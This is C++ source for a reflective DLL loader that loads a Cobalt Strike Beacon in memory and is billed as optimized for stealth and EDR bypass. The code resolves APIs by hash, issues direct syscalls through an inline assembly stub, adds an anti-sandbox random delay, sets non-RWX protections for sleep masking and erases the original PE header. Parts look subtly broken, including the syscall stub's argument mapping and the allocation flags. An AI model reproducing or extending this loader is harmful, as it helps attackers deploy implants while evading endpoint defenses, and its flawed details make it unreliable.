//===============================================================================================//
// Enhanced Reflective Loader with Advanced Evasion Techniques
// Based on Stephen Fewer's Reflective DLL Injection
// Optimized for maximum stealth and EDR bypass
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"
#include "BeaconUserData.h"
#include "TrackMemory.h"

// 优化 1: 扩展的 Windows API 结构，包含内存保护和延迟函数
typedef BOOL(WINAPI* VIRTUALPROTECT)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef VOID(WINAPI* SLEEP)(DWORD);

typedef struct _EXTENDED_APIS {
    LOADLIBRARYA LoadLibraryA;
    GETPROCADDRESS GetProcAddress;
    VIRTUALALLOC VirtualAlloc;
    VIRTUALPROTECT VirtualProtect;
    NTFLUSHINSTRUCTIONCACHE NtFlushInstructionCache;
    SLEEP Sleep;
} EXTENDED_APIS, *PEXTENDED_APIS;

// 优化 2: 直接系统调用结构
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// 优化 3: 系统调用号结构
typedef struct _SYSCALL_INFO {
    DWORD NtAllocateVirtualMemory_SSN;
    DWORD NtProtectVirtualMemory_SSN;
    PVOID NtAllocateVirtualMemory_Addr;
    PVOID NtProtectVirtualMemory_Addr;
} SYSCALL_INFO, *PSYSCALL_INFO;

// 优化 4: 获取系统调用号的函数
DWORD GetSyscallNumber(PVOID functionAddress) {
    BYTE* pFunction = (BYTE*)functionAddress;
    
    // 检查是否是 syscall stub
    // Pattern: mov r10, rcx; mov eax, <syscall_number>; syscall
    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1) {
        if (pFunction[3] == 0xB8) {
            return *(DWORD*)(pFunction + 4);
        }
    }
    
    return 0;
}

// 优化 5: 直接系统调用实现（内联汇编）
extern "C" NTSTATUS SyscallStub(
    DWORD syscallNumber,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5
);

// 汇编实现的系统调用存根
__asm__(
"SyscallStub:\n"
#ifdef _WIN64
"   mov r10, rcx\n"           // ProcessHandle
"   mov eax, edx\n"           // syscall number
"   mov rcx, r8\n"            // BaseAddress
"   mov rdx, r9\n"            // ZeroBits/RegionSize
"   mov r8, [rsp+0x28]\n"     // RegionSize/NewProtect
"   mov r9, [rsp+0x30]\n"     // AllocationType/OldProtect
"   syscall\n"
"   ret\n"
#endif
);

// 优化 6: 解析扩展的 API 函数
BOOL ResolveExtendedApis(_PPEB pebAddress, PEXTENDED_APIS extApi) {
    // 解析基础 API
    constexpr DWORD KERNEL32DLL_HASH = CompileTimeHash("kernel32.dll");
    constexpr DWORD NTDLLDLL_HASH = CompileTimeHash("ntdll.dll");
    
    extApi->LoadLibraryA = (LOADLIBRARYA)GetProcAddressByHash(
        pebAddress, KERNEL32DLL_HASH, CompileTimeHash("LoadLibraryA")
    );
    if (!extApi->LoadLibraryA) return FALSE;
    
    extApi->GetProcAddress = (GETPROCADDRESS)GetProcAddressByHash(
        pebAddress, KERNEL32DLL_HASH, CompileTimeHash("GetProcAddress")
    );
    if (!extApi->GetProcAddress) return FALSE;
    
    extApi->VirtualAlloc = (VIRTUALALLOC)GetProcAddressByHash(
        pebAddress, KERNEL32DLL_HASH, CompileTimeHash("VirtualAlloc")
    );
    if (!extApi->VirtualAlloc) return FALSE;
    
    // 优化：添加 VirtualProtect 用于内存保护切换
    extApi->VirtualProtect = (VIRTUALPROTECT)GetProcAddressByHash(
        pebAddress, KERNEL32DLL_HASH, CompileTimeHash("VirtualProtect")
    );
    if (!extApi->VirtualProtect) return FALSE;
    
    extApi->NtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)GetProcAddressByHash(
        pebAddress, NTDLLDLL_HASH, CompileTimeHash("NtFlushInstructionCache")
    );
    if (!extApi->NtFlushInstructionCache) return FALSE;
    
    // 优化：添加 Sleep 用于延迟执行
    extApi->Sleep = (SLEEP)GetProcAddressByHash(
        pebAddress, KERNEL32DLL_HASH, CompileTimeHash("Sleep")
    );
    
    return TRUE;
}

// 优化 7: 获取系统调用信息
BOOL GetSyscallInfo(_PPEB pebAddress, PSYSCALL_INFO syscallInfo) {
    constexpr DWORD NTDLLDLL_HASH = CompileTimeHash("ntdll.dll");
    
    // 获取 NtAllocateVirtualMemory
    syscallInfo->NtAllocateVirtualMemory_Addr = (PVOID)GetProcAddressByHash(
        pebAddress, NTDLLDLL_HASH, CompileTimeHash("NtAllocateVirtualMemory")
    );
    if (!syscallInfo->NtAllocateVirtualMemory_Addr) return FALSE;
    
    syscallInfo->NtAllocateVirtualMemory_SSN = GetSyscallNumber(
        syscallInfo->NtAllocateVirtualMemory_Addr
    );
    
    // 获取 NtProtectVirtualMemory
    syscallInfo->NtProtectVirtualMemory_Addr = (PVOID)GetProcAddressByHash(
        pebAddress, NTDLLDLL_HASH, CompileTimeHash("NtProtectVirtualMemory")
    );
    if (!syscallInfo->NtProtectVirtualMemory_Addr) return FALSE;
    
    syscallInfo->NtProtectVirtualMemory_SSN = GetSyscallNumber(
        syscallInfo->NtProtectVirtualMemory_Addr
    );
    
    return TRUE;
}

// 优化 8: 随机延迟函数（反沙箱）
VOID RandomDelay(EXTENDED_APIS* extApi) {
    if (!extApi->Sleep) return;
    
    // 使用当前时间作为伪随机数
    ULONG_PTR seed = (ULONG_PTR)extApi;
    seed ^= (seed >> 12);
    seed ^= (seed << 25);
    seed ^= (seed >> 27);
    
    // 延迟 100-500 毫秒
    DWORD delay = (DWORD)((seed % 400) + 100);
    extApi->Sleep(delay);
}

// 优化 9: 擦除 PE 头（增强隐蔽性）
VOID ErasePEHeader(ULONG_PTR baseAddress) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader->e_lfanew);
    
    // 擦除 DOS header (保留前 2 字节以避免崩溃)
    _memset((PVOID)(baseAddress + 2), 0, sizeof(IMAGE_DOS_HEADER) - 2);
    
    // 擦除 NT headers
    _memset((PVOID)ntHeader, 0, sizeof(IMAGE_NT_HEADERS));
}

// 优化 10: 设置正确的内存保护（避免 RWX）
BOOL SetProperMemoryProtections(
    EXTENDED_APIS* extApi,
    PIMAGE_NT_HEADERS ntHeader,
    ULONG_PTR baseAddress,
    PALLOCATED_MEMORY_REGION memoryRegion
) {
    DWORD oldProtect = 0;
    
    // 遍历所有节区
    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)(
        (ULONG_PTR)&ntHeader->OptionalHeader + ntHeader->FileHeader.SizeOfOptionalHeader
    );
    
    DWORD numberOfSections = ntHeader->FileHeader.NumberOfSections;
    
    for (DWORD i = 0; i < numberOfSections; i++) {
        PVOID sectionBase = (PVOID)(baseAddress + sectionHeader[i].VirtualAddress);
        SIZE_T sectionSize = sectionHeader[i].Misc.VirtualSize;
        DWORD protection = PAGE_READONLY;
        
        // 根据节区特征设置保护
        DWORD characteristics = sectionHeader[i].Characteristics;
        
        if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (characteristics & IMAGE_SCN_MEM_WRITE) {
                protection = PAGE_EXECUTE_READWRITE; // 理想情况避免，但某些节区需要
            } else {
                protection = PAGE_EXECUTE_READ; // .text 节区
            }
        } else if (characteristics & IMAGE_SCN_MEM_WRITE) {
            protection = PAGE_READWRITE; // .data 节区
        } else {
            protection = PAGE_READONLY; // .rdata 节区
        }
        
        // 应用保护
        if (!extApi->VirtualProtect(sectionBase, sectionSize, protection, &oldProtect)) {
            return FALSE;
        }
        
        // 跟踪内存用于 Sleep Mask
        ALLOCATED_MEMORY_LABEL label = GetSectionLabelFromName(sectionHeader[i].Name);
        ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask = (label == LABEL_TEXT) ? MASK_TRUE : MASK_FALSE;
        
        TrackAllocatedMemorySection(
            &memoryRegion->Sections[i],
            label,
            sectionBase,
            sectionSize,
            protection,
            mask
        );
    }
    
    return TRUE;
}

/**
 * Enhanced Reflective Loader with maximum evasion capabilities
 *
 * @return The target DLL's entry point
*/
extern "C" {
#pragma code_seg(".text$a")
    ULONG_PTR __cdecl ReflectiveLoader() {
        // ============================================================
        // STEP 0: 初始化和准备
        // ============================================================
#ifdef _WIN64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        void* loaderStart = (char*)GetLocation() - 0xE;
#endif
        PRINT("[+] Enhanced Loader Base Address: %p\n", loaderStart);

        // ============================================================
        // STEP 1: 定位 Beacon DLL
        // ============================================================
#ifdef _STEPHEN_FEWER
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddressStephenFewer();
#else
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();
#endif
        PRINT("[+] Raw DLL Base Address: %p\n", rawDllBaseAddress);

        // ============================================================
        // STEP 2: 解析 PE 头
        // ============================================================
        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        // ============================================================
        // STEP 3: 解析扩展的 API 函数
        // ============================================================
        _PPEB pebAddress = GetPEBAddress();
        EXTENDED_APIS extApi = { 0 };
        if (!ResolveExtendedApis(pebAddress, &extApi)) {
            PRINT("[-] Failed to resolve extended APIs\n");
            return NULL;
        }
        PRINT("[+] Extended APIs resolved successfully\n");

        // 优化：获取系统调用信息
        SYSCALL_INFO syscallInfo = { 0 };
        BOOL useSyscalls = GetSyscallInfo(pebAddress, &syscallInfo);
        if (useSyscalls) {
            PRINT("[+] Direct syscalls enabled (SSN: NtAlloc=%d, NtProtect=%d)\n", 
                  syscallInfo.NtAllocateVirtualMemory_SSN,
                  syscallInfo.NtProtectVirtualMemory_SSN);
        }

        // ============================================================
        // STEP 4: 优化 - 随机延迟（反沙箱）
        // ============================================================
        RandomDelay(&extApi);
        PRINT("[+] Anti-sandbox delay executed\n");

        // ============================================================
        // STEP 5: 分配内存（使用 RW 而不是 RWX）
        // ============================================================
        PVOID loadedDllBaseAddress = NULL;
        SIZE_T allocationSize = (SIZE_T)rawDllNtHeader->OptionalHeader.SizeOfImage;
        
        if (useSyscalls) {
            // 使用直接系统调用分配内存
            NTSTATUS status = ((pNtAllocateVirtualMemory)SyscallStub)(
                (DWORD)syscallInfo.NtAllocateVirtualMemory_SSN,
                (PVOID)(HANDLE)-1,
                (PVOID)&loadedDllBaseAddress,
                (PVOID)0,
                (PVOID)&allocationSize,
                (PVOID)(MEM_RESERVE | MEM_COMMIT | (PAGE_READWRITE << 16))
            );
            
            if (status != 0) {
                loadedDllBaseAddress = NULL;
            }
        } else {
            // 降级到标准 API
            loadedDllBaseAddress = extApi.VirtualAlloc(
                NULL, 
                allocationSize, 
                MEM_RESERVE | MEM_COMMIT, 
                PAGE_READWRITE  // 注意：使用 RW 而不是 RWX
            );
        }
        
        if (loadedDllBaseAddress == NULL) {
            PRINT("[-] Failed to allocate memory. Exiting..\n");
            return NULL;
        }
        PRINT("[+] Allocated RW memory: 0x%p (size: %zu bytes)\n", loadedDllBaseAddress, allocationSize);

        // ============================================================
        // STEP 6: 初始化 Beacon User Data（用于 Sleep Mask）
        // ============================================================
        ALLOCATED_MEMORY allocatedMemory = { 0 };
        ALLOCATED_MEMORY_REGION* beaconRegion = &allocatedMemory.AllocatedMemoryRegions[0];
        
        beaconRegion->Purpose = PURPOSE_BEACON_MEMORY;
        beaconRegion->AllocationBase = loadedDllBaseAddress;
        beaconRegion->RegionSize = allocationSize;
        beaconRegion->Type = MEM_PRIVATE;
        
        // 设置清理信息
        beaconRegion->CleanupInformation.Cleanup = TRUE;
        beaconRegion->CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;

        // ============================================================
        // STEP 7: 复制 PE 头和节区（带内存跟踪）
        // ============================================================
        if (!CopyDllAndTrackMemory(
            beaconRegion,
            rawDllBaseAddress,
            (ULONG_PTR)loadedDllBaseAddress,
            COPY_FALSE,  // 不复制 PE 头（增强隐蔽性）
            PAGE_READWRITE,
            MASK_FALSE
        )) {
            PRINT("[-] Failed to copy DLL sections. Exiting..\n");
            return NULL;
        }
        PRINT("[+] DLL sections copied with memory tracking\n");

        // ============================================================
        // STEP 8: 处理导入表
        // ============================================================
        WINDOWSAPIS basicWinApi = {
            extApi.LoadLibraryA,
            extApi.GetProcAddress,
            extApi.VirtualAlloc,
            extApi.NtFlushInstructionCache
        };
        ResolveImports(rawDllNtHeader, (ULONG_PTR)loadedDllBaseAddress, &basicWinApi);
        PRINT("[+] Imports resolved\n");

        // ============================================================
        // STEP 9: 处理重定位
        // ============================================================
        ProcessRelocations(rawDllNtHeader, (ULONG_PTR)loadedDllBaseAddress);
        PRINT("[+] Relocations processed\n");

        // ============================================================
        // STEP 10: 设置正确的内存保护（RW -> RX/R）
        // ============================================================
        if (!SetProperMemoryProtections(
            &extApi,
            rawDllNtHeader,
            (ULONG_PTR)loadedDllBaseAddress,
            beaconRegion
        )) {
            PRINT("[-] Warning: Failed to set proper memory protections\n");
        } else {
            PRINT("[+] Memory protections set (no RWX pages)\n");
        }

        // ============================================================
        // STEP 11: 优化 - 擦除原始 Beacon 的 PE 头
        // ============================================================
        ErasePEHeader(rawDllBaseAddress);
        PRINT("[+] Original PE header erased\n");

        // ============================================================
        // STEP 12: 刷新指令缓存
        // ============================================================
        extApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // ============================================================
        // STEP 13: 计算入口点
        // ============================================================
        ULONG_PTR entryPoint = (ULONG_PTR)loadedDllBaseAddress + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;
        PRINT("[+] Entry point: %p\n", entryPoint);

        // ============================================================
        // STEP 14: 准备 Beacon User Data
        // ============================================================
        USER_DATA userData = { 0 };
        userData.version = COBALT_STRIKE_VERSION;
        userData.allocatedMemory = &allocatedMemory;
        
        // 注意：syscalls 和 rtls 可以在这里填充以支持高级功能
        // userData.syscalls = &syscallApi;
        // userData.rtls = &rtlApi;

        // ============================================================
        // STEP 15: 调用 Beacon 入口点
        // ============================================================
        PRINT("[*] Calling DLL_PROCESS_ATTACH\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
        
        PRINT("[*] Passing Beacon User Data (DLL_BEACON_USER_DATA)\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, DLL_BEACON_USER_DATA, &userData);
        
        PRINT("[*] Calling DLL_BEACON_START\n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 0x4, NULL);

        PRINT("[+] Enhanced loader completed successfully\n");
        
        // ============================================================
        // STEP 16: 返回入口点
        // ============================================================
        return entryPoint;
    }
}

/*******************************************************************
 * To avoid problems with function positioning, do not add any new
 * functions above this pragma directive.
********************************************************************/
#pragma code_seg(".text$b")

